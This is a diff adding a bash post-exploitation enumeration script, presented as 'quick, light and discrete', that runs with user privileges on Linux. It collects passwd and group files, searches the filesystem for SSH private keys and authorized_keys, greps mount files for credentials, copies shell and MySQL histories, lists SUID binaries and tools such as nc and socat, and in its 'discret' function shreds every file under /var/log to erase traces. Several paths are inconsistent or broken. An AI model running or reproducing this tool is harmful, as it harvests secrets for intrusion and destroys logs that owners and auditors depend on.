@@ -1,0 +1,210 @@
+#!/bin/bash
+
+#################################################################################
+#MIT License                                                                    #
+#                                                                               #
+#Copyright (c) 2023 MikeHorn-git                                                #
+#                                                                               #
+#Permission is hereby granted, free of charge, to any person obtaining a copy   #
+#of this software and associated documentation files (the "Software"), to deal  #
+#in the Software without restriction, including without limitation the rights   #
+#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell      #
+#copies of the Software, and to permit persons to whom the Software is          #
+#furnished to do so, subject to the following conditions:                       #
+#                                                                               #
+#The above copyright notice and this permission notice shall be included in all #
+#copies or substantial portions of the Software.                                #
+#                                                                               #
+#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR     #
+#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,       #
+#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE    #
+#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER         #
+#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,  #
+#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE  #
+#SOFTWARE.                                                                      #
+#################################################################################
+
+# Quick, light and discrete linux enumeration script with user privilege.
+
+directory() {
+	if [ -e ./data ]; then
+		echo "Abort, data exist" && exit
+	else
+		mkdir ./data
+		mkdir ./data/system/
+		mkdir ./data/system/mount/
+		mkdir ./data/sensitive/
+		mkdir ./data/sensitive/history/
+		mkdir ./data/sensitive/users
+		mkdir ./data/network/
+		mkdir ./data/app_process
+	fi
+}
+
+system() {
+	env 2>/dev/null 1>./data/system/env.txt
+	history 2>/dev/null 1>./data/system/history_cmd.txt
+	lscpu 2>/dev/null 1>./data/system/cpu.txt
+	last 2>/dev/null 1>./data/system/last_loggin.txt
+
+	echo -e "list users:\n$(cat /etc/passwd | cut -d: -f1)" 2>/dev/null 1>./data/system/list_users.txt
+	echo ' ' >>./data/system/list_users.txt
+	echo -e "list superusers:\n$(cat /etc/passwd | grep 'x:0:')" 2>/dev/null 1>>./data/system/list_users.txt
+	mount 2>/dev/null 1>./data/system/mount/mount.txt
+	ls /dev 2>/dev/null | grep -i "sd" 1>./data/system/mount/dev.txt
+	if [ -e /etc/fstab ]; then
+		echo '/etc/fstab' | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null 1>./enumeration/system/mount/fstab.txt
+	fi
+	grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null 1>./data/system/mount/potential_creds.txt
+
+	if command -v crontab &>/dev/null; then
+		mkdir ./data/system/cron/
+		crontab -l 2>/dev/null 1>./data/system/cron/crontab.txt
+		ls -al /etc/cron* /etc/at* 2>/dev/null 1>./data/system/cron/crondir.txt
+		cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#" 1>./data/system/cron/croninfos.txt
+	fi
+}
+
+globalsystem() {
+	if command -v apt &>/dev/null; then
+		pm="apt"
+	fi
+	if command -v rpm &>/dev/null; then
+		pm="rpm"
+	fi
+	if command -v pacman &>/dev/null; then
+		pm="pacman"
+	fi
+
+	echo "  Hostname: $(hostname)
+	ID: $(id)
+
+  OS infos: $(cat /proc/version)
+
+	Home directory: $(ls -la /home/)
+
+	Path: $PATH
+
+	Packagement management: $pm
+
+	Date: $(date)
+
+	Block device: $(lsblk)
+
+  File system: $(df -h)" >./data/system/global_info.txt
+}
+
+sensitive() {
+	if [ -r /etc/group ]; then
+		cat /etc/group >./data/sensitive/group.txt
+	fi
+
+	if [ -r /etc/passwd ]; then
+		cat /etc/passwd >./data/sensitive/passwd.txt
+	fi
+
+	if [ -r /etc/services ]; then
+		cat /etc/services >./data/sensitive/services.txt
+	fi
+
+	echo -e "Password:\n$(locate password)" 2>/dev/null 1>./data/sensitive/locate.txt
+	echo -e "\nlist users:\n$(cat /etc/passwd | cut -d: -f1)" 2>/dev/null 1>>./data/sensitive/locate.txt
+
+	ls -aRl /etc/ 2>/dev/null 1>./enumeration/sensitive/etc.txt
+	ls -aRl /var/ 2>/dev/null 1>./enumeration/sensitive/var.txt
+
+	find / -name authorized_keys 2>/dev/null 1>./data/sensitive/authorized_keys.txt
+	find / -name 'id_rsa*' 2>/dev/null 1>>./data/sensitive/id_rsa.txt
+	find / -name 'id_pub*' 2>/dev/null 1>./data/sensitive/id_pub.txt
+
+	if [ -r ~/.bash_history ]; then
+		cat ~/.bash_history 2>/dev/null 1>./enumeration/sensitive/history/bash_history.txt
+	fi
+
+	if [ -r ~/.nano_history ]; then
+		cat ~/.nano_history 2>/dev/null 1>./enumeration/sensitive/history/nano_history.txt
+	fi
+
+	if [ -r ~/.atftp_history ]; then
+		cat ~/.atftp_history 2>/dev/null 1>./enumeration/sensitive/history/atftp_history.txt
+	fi
+
+	if [ -r ~/.mysql_history ]; then
+		cat ~/.mysql_history 2>/dev/null 1>./enumeration/sensitive/history/mysql_history.txt
+	fi
+
+	if [ -r ~/.php_history ]; then
+		cat ~/.php_history 2>/dev/null 1>./enumeration/sensitive/history/php_history.txt
+	fi
+
+	if [ -r ~/.viminfo ]; then
+		cat ~/.viminfo 2>/dev/null 1>./enumeration/sensitive/history/viminfo.txt
+	fi
+
+	if [ -r ~/.zsh_history ]; then
+		cat ~/.zsh_history 2>/dev/null 1>./enumeration/sensitive/history/zsh_history.txt
+	fi
+
+	if [ -r ~/.bashrc ]; then
+		cat ~/.bashrc 2>/dev/null 1>./enumeration/sensitive/users/bashrc.txt
+	fi
+
+	if [ -r ~./profile ]; then
+		cat ~/.profile 2>/dev/null 1>./enumeration/sensitive/users/profile.txt
+	fi
+
+	if [ -r ~./zshrc ]; then
+		cat ~/.zshrc 2>/dev/null 1>./enumeration/sensitive/users/zshrc.txt
+	fi
+}
+
+network() {
+	if command -v nmcli &>/dev/null; then
+		nmcli -p device show 2>/dev/null 1>./data/network/nmcli.txt
+	fi
+
+	if [ -r /etc/services ]; then
+		cat /etc/services 2>/dev/null 1>./data/network/services.txt
+	fi
+
+	if [ -r /etc/resolv.conf ]; then
+		cat /etc/resolv.conf 2>/dev/null 1>./data/network/resolv.conf.txt
+	fi
+
+	cat ip -a 2>/dev/null 1>./data/network/ip.txt
+	cat ip route 2>/dev/null 1>./data/network/route.txt
+	ss -la 2>/dev/null 1>./data/network/sockets.txt
+}
+
+app_process() {
+	which cron nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 perl php ruby xterm doas sudo \
+		fetch docker lxc ctr runc rkt kubectl find vim nano bash less more copy 2>/dev/null | grep / >./data/app_process/binaries.txt
+	ps -ef 2>/dev/null 1>./data/app_process/process.txt
+	ps -ef | grep root 2>/dev/null 1>./data/app_process/process_root.txt
+	find / -perm -u=s -type f 2>/dev/null 1>./data/app_process/binaries_suid.txt
+	find / -writable -type d 2>/dev/null 1>./data/app_process/world-writeable.txt
+	find / -perm -o x -type d 2>/dev/null 1>./data/app_process/world-executable.txt
+	systemctl list-unit-files --type=service --state=enabled --all 2>/dev/null 1>./data/app_process/systemctl.txt
+}
+
+discret() {
+	if command -v shred &>/dev/null; then
+		find /var/log -depth -type f -exec shred -x -f -z -u {} \; 2>/dev/null
+	elif command -v wipe &>/dev/null; then
+		find /var/log -depth -type f -exec wipe -rf {} \; 2>/dev/null
+	elif command -v secure-delete &>/dev/null; then
+		find /var/log -depth -type f -exec srm -rz {} \; 2>/dev/null
+	fi
+}
+
+main() {
+	directory
+	system
+	globalsystem
+	sensitive
+	network
+	app_process
+	discret
+}
+
+main
